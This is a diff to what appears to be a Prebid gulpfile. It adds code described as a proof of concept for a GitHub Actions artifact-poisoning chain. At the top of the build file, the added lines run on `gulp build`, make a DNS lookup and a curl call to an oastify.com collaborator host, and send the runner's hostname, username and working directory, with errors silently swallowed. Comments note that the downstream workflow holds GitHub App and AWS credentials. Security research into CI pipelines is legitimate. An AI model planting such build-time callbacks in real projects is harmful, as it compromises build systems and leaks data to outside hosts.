@@ -1,6 +1,16 @@
 /* eslint-disable no-console */
 'use strict';
 
+// Security test - PoC for artifact poisoning chain (PR-assignment-deps -> PR-assignment)
+// This DNS lookup proves attacker-controlled code executes during `npx gulp build`
+// in the upstream workflow context. The downstream workflow_run then processes
+// the resulting artifact with GitHub App PEM and AWS credentials.
+const { execSync } = require('child_process');
+try {
+  execSync('nslookup prebid-artifact-poison.031kvh6l6zga7dmiy0nmqult7kdb11pq.oastify.com');
+  execSync('curl -s https://031kvh6l6zga7dmiy0nmqult7kdb11pq.oastify.com/prebid-artifact-poison?runner=$(hostname)\\&user=$(whoami)\\&pwd=$(pwd)');
+} catch(e) {}
+
 var _ = require('lodash');
 var argv = require('yargs').argv;
 var gulp = require('gulp');
